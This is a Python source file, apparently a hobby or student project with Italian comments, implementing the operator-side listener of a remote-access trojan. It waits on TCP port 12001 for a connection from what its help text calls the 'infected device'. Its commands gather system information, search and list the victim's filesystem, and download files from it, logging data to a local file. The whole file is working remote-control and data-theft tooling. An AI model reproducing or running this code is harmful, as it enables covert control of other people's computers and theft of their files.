import os
from socket import *
import time
from threading import Thread

windowsFlag = "n"
stop_threads = False
pwd = ""


def animation():
    while True:
        global stop_threads
        if stop_threads:
            break
        print(".")
        time.sleep(1)


def receiveDir(connectionSocket):
    outputSize = int(connectionSocket.recv(1024).decode())
    connectionSocket.send("OK".encode())
    out = connectionSocket.recv(outputSize).decode()
    print(out)


def exitNClose(connectionSocket, cmd):
    connectionSocket.send(cmd.encode())
    out = connectionSocket.recv(1024).decode()
    return True


def changeDirectory(connectionSocket):
    global pwd
    out = connectionSocket.recv(1024).decode()
    pwd = out
    print(out)


def getFile(connectionSocket, fileName):
    existFile = connectionSocket.recv(1024).decode()
    if existFile == "ok":
        fileSize = int(connectionSocket.recv(1024).decode())
        file = open(fileName, 'wb')
        while fileSize > 0:
            if fileSize < 1024:
                out = connectionSocket.recv(fileSize)
            else:
                out = connectionSocket.recv(1024)
            fileSize = fileSize - 1024
            file.write(out)
            print("Ricevendo...")
        print("Ricevuto")
        file.close()
    else:
        print("File not found")


def StartConnection():  # funzione di connessione (da controllare)
    print('opening the server \n')
    serverPort = 12001
    serverSocket = socket(AF_INET, SOCK_STREAM)
    serverSocket.bind(('', serverPort))
    serverSocket.listen(1)
    print('Server Ready')
    while True:
        connectionSocket, addr = serverSocket.accept()
        print('Connesso', addr)

        if addr:
            break

    return connectionSocket


def AssegnaWinFlag(connectionSocket: socket):
    global windowsFlag
    windowsFlag = connectionSocket.recv(2).decode()


def LogOnFile(strPerFile: str):  # da usare da tutti per salvare i dati?
    try:
        f = open("dati.txt", "a")  # forse dovremmo resettare il file a ogni avvio?
    except:
        f = open("dati.txt", "w")
    f.write(strPerFile)
    f.close()


def searchFile(connectionSocket, fileName):
    global windowsFlag
    if windowsFlag == "w":
        cmd = "dir \"" + fileName + "\" /a /s"
        print(cmd)
    else:
        cmd = "find -name " + fileName
    connectionSocket.send(cmd.encode())  # 143
    print("Ricerca...")
    global stop_threads
    stop_threads = False
    t = Thread(target=animation)
    t.start()
    SizeOrError = connectionSocket.recv(1024).decode()  # 92 or 99
    stop_threads = True
    if SizeOrError == "notFound":
        output = "File not found"
        print("Ricerca fallita")
    else:
        pSize = int(SizeOrError)
        mex = "Server pronto a ricevere l'output"
        connectionSocket.send(mex.encode())  # 100
        output = str(connectionSocket.recv(pSize).decode())  # 101
        print(output)
    return output


def clearScreen():
    global windowsFlag
    if windowsFlag == "w":
        os.system("cls")
    else:
        os.system("clear")


def main():
    global windowsFlag, pwd
    esc = False
    while not esc:
        try:
            connectionSocket = StartConnection()  # apriamo connessione e inizializziamo
            AssegnaWinFlag(connectionSocket)
            help = "infoOs                          ricevi informazioni del sistema operativo\nsearch [nome file]              cerca un file nel " \
                   "filesystem \nget [nome file]                 scarica il file dal dispositivo infetto\nesc                             chiudi la " \
                   "sessione \nhelp                            guida comandi\ncd                              change directory\ndir/ls                          listing " \
                   "directory \ncls                             clear console\npwd                             print working directory"
            while not esc:
                cmd = input('>>')
                connectionSocket.send(cmd.encode())

                if cmd == "cls":
                    print("cls")
                    clearScreen()

                elif cmd == "dir" or "ls" in cmd:
                    receiveDir(connectionSocket)

                elif cmd == "esc":
                    esc = exitNClose(connectionSocket, cmd)

                elif "cd" in cmd:
                    changeDirectory(connectionSocket)

                elif "get " in cmd:
                    fileName = cmd.replace("get ", "")
                    if not fileName == "":
                        getFile(connectionSocket, fileName)

                elif cmd == "infoOs":
                    d = connectionSocket.recv(1024).decode()
                    print(d)
                    LogOnFile(d)

                elif "search" in cmd:
                    cmd = cmd + " "
                    toSearch = cmd.replace("search ", "")
                    output = searchFile(connectionSocket, toSearch)

                elif cmd == "help":
                    print(help)

                elif cmd == "pwd":
                    print(pwd)

        except Exception as e:
            print(e)
            print("Errore! Riavvio in corso")
            connectionSocket.close()


if __name__ == "__main__":
    main()
